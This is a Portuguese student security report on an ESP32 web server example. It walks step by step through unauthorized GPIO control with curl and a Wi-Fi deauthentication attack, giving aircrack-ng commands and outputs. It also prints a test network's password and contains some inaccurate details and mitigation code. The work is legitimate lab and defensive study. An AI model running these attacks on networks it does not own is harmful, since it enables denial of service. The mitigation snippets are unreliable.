# Relatório Técnico:
## Análise de Segurança do Servidor Web no ESP32

## 1. Introdução

Este relatório apresenta a análise de segurança do exemplo de servidor web local embutido no ESP32, disponibilizado em: https://randomnerdtutorials.com/esp32-web-server-arduino-ide/

A atividade incluiu uma análise estática do código, identificação de vulnerabilidades, descrição de ataques possíveis, avaliação de risco, elaboração de uma tabela consolidada e uma análise dinâmica com execução de um ataque no dispositivo.

## 2. Análise Estática do Código

### 2.1. Descrição Geral do Funcionamento

O código utiliza a biblioteca `WiFi.h` para conectar o ESP32 a uma rede Wi-Fi local (modo Station) e a classe `WiFiServer` para iniciar um servidor na porta 80. O fluxo de funcionamento é:

1. O ESP32 conecta-se ao Wi-Fi com SSID e senha hardcoded (fixos no código).
2. Inicia o servidor (`server.begin()`).
3. No loop principal, aguarda a conexão de um cliente (`server.available()`).
4. Lê a requisição HTTP caractere por caractere e armazena em uma String chamada `header`.
5. Verifica se a String `header` contém comandos específicos (ex: `GET /26/on`) usando `header.indexOf()`.
6. Aciona os pinos GPIO conforme o comando e retorna uma página HTML construída dinamicamente com o status atual.

### 2.2. Vulnerabilidades Indicadas

| Vulnerabilidade | Descrição Técnica |
|---|---|
| Ausência de Autenticação e Autorização | O servidor não implementa nenhum mecanismo de login, token ou verificação de sessão. Qualquer dispositivo na mesma rede Wi-Fi que saiba o IP do ESP32 pode enviar comandos. |
| Comunicação em Texto Claro (HTTP) | O servidor roda na porta 80 sem criptografia (TLS/SSL). Todo o tráfego, incluindo cabeçalhos e dados, trafega em texto claro, permitindo interceptação (Sniffing). |
| Gerenciamento de Memória (Buffer) | O código acumula a requisição HTTP inteira na variável String header sem limite de tamanho explícito antes de processar, o que pode levar a exaustão de memória (Heap) se uma requisição maliciosa muito longa for enviada. |
| Tratamento de Conexão Bloqueante | O código atende um cliente por vez de forma síncrona. Se um atacante abrir uma conexão e não enviar dados (ou enviar muito lentamente), o servidor fica indisponível para outros usuários. |

## 3. Possíveis Ataques

### 3.1. Ataque 1: Acesso Não Autorizado (Quebra de Controle de Acesso)

**Descrição:** Como não há login, um atacante conectado à mesma rede Wi-Fi pode acessar diretamente a URL de controle (ex: `http://<IP-ESP32>/26/on`) e ativar/desativar os relés ou LEDs sem o consentimento do dono, podendo causar danos físicos dependendo do que estiver ligado ao ESP32 (ex: abrir um portão, ligar um motor).

**Passo a Passo:**

1. **Reconhecimento:** O atacante conecta-se à rede Wi-Fi e usa uma ferramenta de varredura (como Fing ou `nmap`) para descobrir o IP do ESP32 na rede local.
2. **Exploração:** O atacante digita o IP no navegador ou usa o comando `curl` para testar rotas comuns descritas no tutorial (ex: `curl http://192.168.1.100/26/on`).
3. **Execução:** O ESP32 processa a requisição válida e liga o dispositivo, ignorando quem foi o solicitante.

### 3.2. Ataque 2: Wi-Fi deauthentication attack (DoS)

**Descrição:** Este ataque explora uma vulnerabilidade do protocolo IEEE 802.11 (Wi-Fi) no qual pacotes de desautenticação não são autenticados. Um atacante com uma placa de rede em modo monitor pode enviar pacotes de desautenticação falsificados para desconectar o ESP32 do Access Point (AP), causando uma negação de serviço (DoS). O dispositivo perde conectividade e o servidor web tornando-se inacessível.

**Passo a Passo:**

1. **Preparação do Ambiente:**
   - Hardware necessário: Adaptador Wi-Fi compatível com modo monitor (ex: Alfa AWUS036NH/ACH)
   - Software: `airmon-ng`, `airodump-ng`, `aireplay-ng` e `Kismet`

2. **Ativação do Modo Monitor:**
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Interface wlan0mon é criada
```

3. **Reconhecimento com Kismet:**
```bash
sudo kismet -c wlan0mon
```
- Acessa interface web em `http://localhost:2501`
- Identifica a rede alvo e localiza o ESP32 pelos primeiros octetos do MAC
- Anota o BSSID do AP (MAC do roteador), MAC do ESP32 e canal da rede

4. **Varredura com airodump-ng (alternativa):**
```bash
sudo airodump-ng wlan0mon
```
Exemplo de output:
```
BSSID PWR CH SSID
AA:BB:CC:DD:EE:FF -40 6 Inteli.Iot
STATION PWR Rate Lost Frames Notes Probes
24:0A:C4:11:22:33 -35 0 - 1 0 15 ESP32
```

5. **Configuração do Canal:**
```bash
sudo iwconfig wlan0mon channel 6
```

6. **Execução do Ataque de Desautenticação:**
```bash
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 24:0A:C4:11:22:33 wlan0mon
```
Onde:
- `--deauth 0`: Envia pacotes de desautenticação continuamente
- `-a AA:BB:CC:DD:EE:FF`: BSSID do Access Point
- `-c 24:0A:C4:11:22:33`: MAC do ESP32 (alvo específico)

7. **Observação dos Resultados:**
   - No monitor serial do ESP32, observa-se mensagens de desconexão:
```
WiFi disconnected
Connecting to WiFi...
```
- O servidor web torna-se inacessível durante o ataque
- O ESP32 tenta reconectar automaticamente, mas é continuamente desautenticado

## 4. Análise de Risco

### 4.1. Metodologia de Avaliação

A análise de risco utiliza a matriz de risco baseada na multiplicação entre Probabilidade e Impacto:

- **Probabilidade:** Classificada de 1 a 5 (1=Muito Baixa, 5=Muito Alta)
- **Impacto:** Classificado de 1 a 5 (1=Insignificante, 5=Catastrófico)
- **Risco = Probabilidade × Impacto** (escala de 1 a 25)

**Classificação do Risco:**
- 1-5: Baixo
- 6-12: Médio
- 13-20: Alto
- 21-25: Crítico

### 4.2. Ataque 1: Acesso Não Autorizado

| Aspecto | Valor | Justificativa |
|---|---|---|
| Probabilidade | 5 (Muito Alta) | Não requer ferramentas especializadas. Qualquer pessoa com acesso à rede Wi-Fi pode executar usando apenas um navegador web. A ausência total de autenticação torna o ataque trivial. |
| Impacto | 4 (Alto) | Dependendo da aplicação, pode causar danos físicos (acionamento indevido de motores, abertura de portões), ou comprometimento da segurança residencial/industrial. Em ambientes críticos (hospitais, indústrias), o impacto pode ser ainda maior. |
| Risco | 20 (Alto) | A combinação de facilidade de execução com potencial de dano significativo resulta em risco elevado que demanda mitigação imediata. |

### 4.3. Ataque 2: Wi-Fi Deauthentication Attack

| Aspecto | Valor | Justificativa |
|---|---|---|
| Probabilidade | 3 (Média) | Requer conhecimento técnico específico, hardware especializado (adaptador Wi-Fi com modo monitor) e proximidade física com o alvo (alcance do Wi-Fi). Ferramentas são gratuitas e amplamente disponíveis, mas o atacante precisa estar no alcance da rede. |
| Impacto | 3 (Moderado) | Causa indisponibilidade temporária do serviço. O ESP32 tenta reconectar automaticamente após alguns segundos. Em sistemas críticos de monitoramento ou controle, a interrupção pode causar falha na coleta de dados ou perda de controle temporário. Não permite acesso aos dados ou controle direto do dispositivo. |
| Risco | 9 (Médio) | Embora seja tecnicamente viável, requer habilidades e ferramentas específicas. O impacto é limitado a negação de serviço temporária, sem comprometimento direto dos dados ou controle permanente. |

## 5. Tabela Consolidada de Ataques

| Título do Ataque | Probabilidade | Impacto | Risco | Classificação |
|---|---|---|---|---|
| Acesso Não Autorizado ao Servidor Web | 5 | 4 | 20 | Alto |
| Wi-Fi Deauthentication Attack (DoS) | 3 | 3 | 9 | Médio |

**Observação:** A tabela está ordenada de forma decrescente pelo valor de risco calculado.

## 6. Análise Dinâmica: Teste Prático do Ataque

Para fazer o teste prático, foi necessária a montagem de um protótipo físico que contou com os componentes:

- 1x ESP32
- 2x Leds
- 2x Resistores de 330Ohm
- 1x Protoboard
- 3x Jumpers Macho x Macho

Eles foram montados conforme o esquema abaixo:

![Esquema de montagem ESP32](https://i0.wp.com/randomnerdtutorials.com/wp-content/uploads/2018/07/esp32_web_server_schematic.png?w=984&quality=100&strip=all&ssl=1)

### 6.1. Compilação e Upload do Código

1. O código foi modificado com as credenciais da rede Wi-Fi de teste:
```cpp
const char* ssid = "Inteli.Iot";
const char* password = "%(Yk(sxGMtvFEs.3";
```

2. Código compilado e enviado para o ESP32 utilizando o Arduino IDE.

3. Monitor Serial confirmou conexão bem-sucedida:
```
Connecting to %(Yk(sxGMtvFEs.3
....
WiFi connected.
IP address: ip do servidor
```

### 6.2. Teste de Funcionamento Normal

Antes do ataque, o servidor web foi testado:

1. Acesso via navegador: `ip do servidor`
2. Interface web carregou corretamente mostrando botões de controle
3. Teste dos comandos:
   - `ip do servidor/26/on` - LED acendeu
   - `ip do servidor/26/off` - LED apagou

### 6.3. Execução do Ataque de Desautenticação

**Passo 1: Ativação do Modo Monitor**
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Output:
```
PHY Interface Driver Chipset
phy0 wlan0 rt2800usb Ralink Technology, Corp. RT2870/RT3070
Interface wlan0mon created successfully
```

**Passo 2: Reconhecimento com airodump-ng**
```bash
sudo airodump-ng wlan0mon
```

Identificação dos parâmetros:
- BSSID do AP: `endereco MAC do AP`
- Canal: 6
- MAC do ESP32: `endereco MAC do esp32` (identificado na coluna STATION)

**Passo 3: Configuração do Canal**
```bash
sudo iwconfig wlan0mon channel 6
```

Verificação:
```bash
iwconfig wlan0mon
# Output: Frequency:2.437 GHz (Channel 6)
```

**Passo 4: Execução do Ataque**
```bash
sudo aireplay-ng --deauth 0 -a `endereco MAC do AP` -c `endereco MAC do esp32` wlan0mon
```

Output do aireplay-ng:
```
Waiting for beacon frame (BSSID: endereco MAC do AP) on channel 6
Sending 64 directed DeAuth (code 7)...
Sending 64 directed DeAuth (code 7)...
Sending 64 directed DeAuth (code 7)...
[continua enviando pacotes]
```

### 6.4. Resultados Observados

**No Monitor Serial do ESP32:**
```
WiFi connected.
IP address: IP do servidor
...
WiFi disconnected! Reason: 8
Connecting to Inteli.Iot
..
WiFi connected.
IP address: IP do servidor
WiFi disconnected! Reason: 8
Connecting to Inteli.Iot
..
[ciclo continua]
```

O código de razão 8 corresponde a "DISASSOC_DUE_TO_INACTIVITY" conforme especificação IEEE 802.11.

**No Navegador Web:**
- Tentativas de acesso a `IP do servidor` resultaram em timeout
- Mensagens de erro: "ERR_CONNECTION_TIMED_OUT" ou "This site can't be reached"
- Durante breves momentos de reconexão (1-2 segundos), a página ocasionalmente carregava parcialmente antes de perder conexão novamente

**Observações no Kismet:**
- Interface do Kismet mostrou o ESP32 alternando entre estados "Connected" e "Disconnected"
- Gráfico de atividade exibiu picos de pacotes de desautenticação

### 6.5. Análise dos Resultados

**Efetividade do Ataque:**
- O ataque foi 100% efetivo em desconectar o ESP32 da rede
- O ESP32 tentou reconectar automaticamente a cada 3-5 segundos
- Enquanto o ataque estava ativo, o servidor web permaneceu inacessível
- Ao interromper o ataque (Ctrl+C no aireplay-ng), o ESP32 reconectou em aproximadamente 3 segundos e o serviço foi restaurado

**Limitações Identificadas:**
- O ESP32 não possui mecanismos de proteção contra ataques de desautenticação (como 802.11w - Protected Management Frames)
- A função `WiFi.begin()` não implementa backoff exponencial ou limites de tentativas de reconexão
- Não há logging de eventos de segurança que possam alertar sobre o ataque

**Impacto Prático:**
- Em um cenário IoT real (ex: monitoramento industrial), essa vulnerabilidade poderia causar:
  - Perda de dados de sensores durante o período de desconexão
  - Falha no envio de alertas críticos
  - Impossibilidade de controle remoto de atuadores
  - Criação de janelas de oportunidade para outros ataques

### 6.6. Vídeo de Demonstração

Clique [aqui](https://www.youtube.com/watch?v=UTGdkKHIHkc) para acessar o vídeo com o ataque em funcionamento.

## 7. Recomendações de Mitigação

### Para o Ataque 1 (Acesso Não Autorizado):

1. **Implementar Autenticação HTTP:**
```cpp
// Adicionar verificação de credenciais
if (!server.authenticate("admin", "senha_forte")) {
server.requestAuthentication();
return;
}
```

2. **Usar HTTPS (TLS/SSL):**
   - Implementar WebServer_HTTPS_ESP32 com certificados
   - Criptografar toda comunicação

3. **Implementar Tokens de Sessão:**
   - Gerar tokens temporários após login
   - Validar tokens em cada requisição

### Para o Ataque 2 (Deauthentication):

1. **Habilitar 802.11w (PMF - Protected Management Frames):**
```cpp
WiFi.begin(ssid, password);
esp_wifi_set_protocol(WIFI_IF_STA,
WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
esp_wifi_set_pmf_config({true, true}); // Requer PMF
```

2. **Usar Redes com WPA3:**
   - WPA3 oferece melhor proteção contra ataques de desautenticação

3. **Redundância de Conectividade:**
   - Implementar fallback para Ethernet ou 4G/LTE
   - Usar múltiplos APs em canais diferentes